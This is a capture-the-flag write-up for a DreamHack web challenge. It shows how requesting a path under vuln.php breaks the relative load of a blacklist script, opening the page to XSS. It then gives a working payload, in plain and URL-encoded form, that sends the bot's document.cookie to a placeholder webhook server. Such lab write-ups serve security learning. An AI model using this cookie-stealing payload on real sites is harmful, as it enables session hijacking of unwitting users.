# Relative Path Overwrite — DreamHack

> **Room / Challenge:** Relative Path Overwrite (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Relative Path Overwrite (web)
- **Link**: `https://dreamhack.io/wargame/challenges/439`
- **Level:** `2`
- **Date:** `17-11-2025`

---

## Goal

Injecting XSS and leveraging Relative Path to get the flag.

## My Solution

The app has the `vuln.php` where we can inject XSS Scripting:

```php
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var url = new URL(window.location.href);
    var param = url.searchParams.get("param");
    if (typeof filter !== 'undefined') {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }

    param_elem.innerHTML = param;
</script>
```

However it has a blacklists in `filter.js`:

```javascript
var filter = ["script", "on", "frame", "object"];
```

But we can still bypass this blacklist by not using the `/?page=vuln&param=<PAYLOAD>`, and we use `vuln.php/a?param=<img src=x onerror="alert(1)">`:
![Guide image](./screenshots/1.png)
This XSS works because when we visit `/vuln.php/a`, it sees the `/vuln.php/a/filter.js`, but there isn't `filter.js` in that directory so the javascript will works, there isn't the blacklist.

From this, we can force the `bot.py` to make a request with the cookie (which is the flag), and to prevent the race condition, I use this payload:

```javascript
var r = new XMLHttpRequest();
r.open("GET", "https://YOUR_SERVER/webhook?c=" + document.cookie, false);
r.send();
```

URL encoded this to prevent any error:

```
vuln.php/a?param=%3Cimg%20src=x%20onerror=%22var%20r=new%20XMLHttpRequest%28%29;%20r.open%28%27GET%27,%20%27https://YOUR_SERVER/webhook?c=%27%2Bdocument.cookie,%20false%29;%20r.send%28%29;%22%3E
```

Submit this in `/?page=report` to get the flag:
![Guide image](./screenshots/2.png)
